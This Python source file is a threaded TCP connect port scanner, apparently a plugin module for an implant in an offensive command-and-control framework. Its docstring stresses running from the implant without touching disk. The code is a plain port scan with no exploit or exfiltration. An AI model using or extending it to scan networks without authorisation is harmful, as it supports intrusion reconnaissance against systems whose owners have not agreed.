"""Built-in TCP port scanner — connect scan with threading.
No external dependencies (nmap). Works from the implant without touching disk."""

import socket
import concurrent.futures
import time
from typing import Optional


def scan_ports(host: str, ports: list[int], timeout: float = 2.0, max_threads: int = 50) -> dict:
    """Scan TCP ports on a host using connect method.

    Returns dict of {port: "open"|"closed"|"filtered"}.
    """
    results = {}

    def _scan_port(port: int) -> tuple[int, str]:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((host, port))
            sock.close()
            return port, "open" if result == 0 else "closed"
        except socket.timeout:
            return port, "filtered"
        except (ConnectionRefusedError, OSError):
            return port, "closed"

    with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as pool:
        futures = {pool.submit(_scan_port, p): p for p in ports}
        for future in concurrent.futures.as_completed(futures):
            port, status = future.result()
            results[port] = status

    return results


def parse_port_spec(spec: str) -> list[int]:
    """Parse port specification string into a list of port numbers.
    Supports: single (80), range (1-1024), comma-separated (22,80,443),
    and common (common)."""
    if spec.strip().lower() == "common":
        return [20, 21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443,
                445, 993, 995, 1723, 3306, 3389, 5900, 8080, 8443]

    ports = []
    for part in spec.split(","):
        part = part.strip()
        if "-" in part:
            start, end = part.split("-", 1)
            ports.extend(range(int(start.strip()), int(end.strip()) + 1))
        else:
            ports.append(int(part))
    return sorted(set(ports))


def run(args: list[str]) -> str:
    """Module entry point for plugin system.

    Usage:
        scan <host> [ports] [timeout]
        ports: port spec string (default: "common")
    """
    if len(args) < 1:
        return "Usage: scan <host> [ports:common|1-1024|22,80,443] [timeout:2.0]"

    host = args[0]
    port_spec = args[1] if len(args) > 1 else "common"
    timeout = float(args[2]) if len(args) > 2 else 2.0

    ports = parse_port_spec(port_spec)

    start_time = time.time()
    results = scan_ports(host, ports, timeout=timeout)
    elapsed = time.time() - start_time

    open_ports = [p for p, s in sorted(results.items()) if s == "open"]
    filtered = [p for p, s in sorted(results.items()) if s == "filtered"]

    lines = [
        f"Scan of {host}: {len(ports)} ports in {elapsed:.1f}s",
        f"Open: {', '.join(map(str, open_ports)) or 'none'}",
    ]
    if filtered:
        lines.append(f"Filtered: {', '.join(map(str, filtered))}")

    return "\n".join(lines)
